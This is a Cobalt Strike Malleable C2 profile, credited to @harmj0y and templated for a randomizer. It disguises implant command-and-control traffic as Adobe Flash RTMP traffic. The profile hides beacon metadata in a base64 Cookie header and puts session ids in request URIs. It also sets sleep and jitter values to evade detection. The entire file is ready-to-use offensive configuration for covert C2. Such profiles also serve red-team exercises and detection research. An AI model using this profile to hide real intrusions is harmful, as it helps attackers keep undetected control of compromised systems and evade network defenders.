# This profile has been modified to use with the Malleable C2 Profile Randomizer

#
# Adode Real-Time-Messaging-Protcol (RTMP) profile
# 
# Author: @harmj0y
#

set sleeptime "%%number:2%%0";
set jitter    "1%%number%%";
set maxdns    "24%%number%%";
set useragent "Shockwave Flash";

http-get {

    set uri "/idle/%%number:10%%/1";

    client {

        header "Accept" "*/*";
        header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";
        header "Content-Type" "application/x-fcs";

        metadata {
            base64;
            header "Cookie";
        }
    }

    server {

        header "Content-Type" "application/x-fcs";
        header "Connection" "Keep-Alive";
        header "Server" "FlashCom/3.5.7";
        header "Cache-Control" "no-cache";

        output {
            print;
        }
    }
}

http-post {
    
    set uri "/send/%%number:10%%/";

    client {

        header "Accept" "*/*";
        header "Connection" "Keep-Alive";
        header "Cache-Control" "no-cache";
        header "Content-Type" "application/x-fcs";

        id {
            uri-append;
        }

        output {
            print;
        }
    }

    server {

        header "Content-Type" "application/x-fcs";
        header "Connection" "Keep-Alive";
        header "Server" "FlashCom/3.5.7";
        header "Cache-Control" "no-cache";

        output {
            print;
        }
    }
}
